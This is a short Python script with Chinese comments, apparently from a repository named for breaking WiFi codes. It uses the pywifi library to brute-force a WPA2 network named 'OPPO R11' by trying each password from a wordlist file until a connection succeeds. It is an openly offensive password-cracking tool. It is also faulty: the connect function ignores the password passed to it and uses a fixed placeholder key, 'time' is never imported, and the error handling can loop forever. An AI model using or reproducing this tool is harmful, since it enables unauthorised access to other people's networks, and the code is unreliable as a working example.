import  pywifi
from pywifi import const

# 导入模块
# 抓取网卡接口
# 断开所有的WiFi
# 读取密码本
# 设置睡眠时间

# 测试连接 返回连接的结果
def wificonnect():
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有的连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # print("未连接")
        # 创建WIFI连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = "OPPO R11"#"想连接wifi的名称"
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # WiFi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = "xxxx"
        # 删除所有的WiFI文件
        ifaces.remove_all_network_profile()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        # 用新的连接文件去测试连接
        ifaces.connect(tep_profile)
        # WiFi连接时间
        time.sleep(4)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else :
            return False
    else:
        print("已连接")

#wificonnect()

def readPassword():
    print("开始破解")
    # 读取密码本的路径
    path = "F:\github_repository\Breaking-the-wifi-code\pass.txt"
    # 打开文件 r read
    file = open(path,"r")
    while True:
        # 读取文件出现错误
        try:
            # readline 读取一行
            passStr = file.readline()
            bool = wificonnect(passStr)
            if bool:
                print("密码正确",passStr)
                # 跳出当前循环
                break
            else:
                print("密码错误",passStr)
        except:
            # 跳出循环直接进行下一个
            continue

readPassword()